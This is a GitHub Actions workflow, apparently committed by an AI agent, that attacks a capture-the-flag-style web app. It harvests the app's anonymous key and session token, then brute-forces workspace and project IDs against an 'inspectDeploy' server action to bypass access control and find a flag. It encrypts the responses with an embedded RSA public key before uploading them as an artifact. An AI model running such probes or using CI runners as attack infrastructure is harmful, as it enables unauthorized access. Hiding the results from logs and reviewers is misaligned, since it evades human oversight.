name: launchlet-part3-actioncaps

on:
  push:
    branches: [agent/launchlet-part3-actioncaps-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe capability values as action args and encrypt responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          b=s.get(base+'api/app/bootstrap',timeout=15).json(); mf=s.get(base+b['api']['buildManifest'].lstrip('/'),timeout=15).json(); refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=15).json(); a=refs['serverActions']['inspectDeploy']; url=base+a['endpoint'].lstrip('/')
          h={'Content-Type':'application/json','X-Launchlet-Preview':b['project'],'apikey':b['client']['anonKey'],'Authorization':'Bearer '+b['client']['session']}
          # get live ref
          r=s.post(url,headers=h,json={'actionId':a['id'],'args':{'workspaceId':b['workspace'],'projectId':b['project']}},timeout=10); ref=r.json()['inspector']['deployRef']
          vals=[b['workspace'],b['project'],mf['build'],mf['previewReceipt'],ref,'8b11c','2026','rc3','2026.05.16-rc3','preview','deploy','release','production','enterprise','ws-launchlet-internal']
          pairs=[]
          for ws in vals:
            for p in vals:
              if (ws,p) in [(b['workspace'],b['project'])]: continue
              # focused: at least one capability-like value
              if not ({ref,mf['build'],mf['previewReceipt'],'8b11c','2026.05.16-rc3'} & {ws,p}): continue
              pairs.append((ws,p))
          res=[]
          for ws,p in pairs:
            body={'actionId':a['id'],'args':{'workspaceId':ws,'projectId':p}}
            rr=s.post(url,headers=h,json=body,timeout=10)
            res.append({'workspaceId':ws,'projectId':p,'status':rr.status_code,'body':rr.text,'headers':dict(rr.headers)})
            if re.search(r'caplag\{[^}]+\}',rr.text):(out/'FOUND.txt').write_text(rr.text)
          (out/'summary.json').write_text(json.dumps({'ref':ref,'count':len(res),'results':res},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-actioncaps-encrypted
          path: artifact/
          retention-days: 1
